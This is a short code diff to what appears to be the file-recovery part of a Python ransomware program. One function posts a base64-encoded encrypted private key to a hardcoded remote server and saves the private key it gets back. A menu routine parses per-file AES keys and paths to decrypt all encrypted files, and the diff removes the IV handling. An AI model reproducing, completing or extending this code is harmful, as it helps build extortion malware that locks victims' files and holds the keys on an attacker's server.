@@ -14,6 +14,7 @@ server_address = tuple("123.123.123.123")
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
     encoded = base64.b64encode(private_encrypted_key)
     address = server_address[0] + '/' + id
+
     retorno = requests.post(address, encoded)
     private_key = retorno.text()
     with open("private_key", 'w') as f:
@@ -52,13 +53,11 @@ def menu():
     # get the aes keys and IV's and paths back
     decrypted_content = decrypted_content.split('\n')
     aes_keys = []
-    aes_ivs = []
     files_path = []
     for line in decrypted_content:
-        ret = line.split(' ') # KEY IV base64(PATH)
+        ret = line.split(' ') # KEY base64(PATH)
         aes_keys.append(ret[0])
-        aes_ivs.append(ret[1])
-        files_path.append(base64.b64decode(ret[2]))
+        files_path.append(base64.b64decode(ret[1]))
 
 
     # decrypt all files 
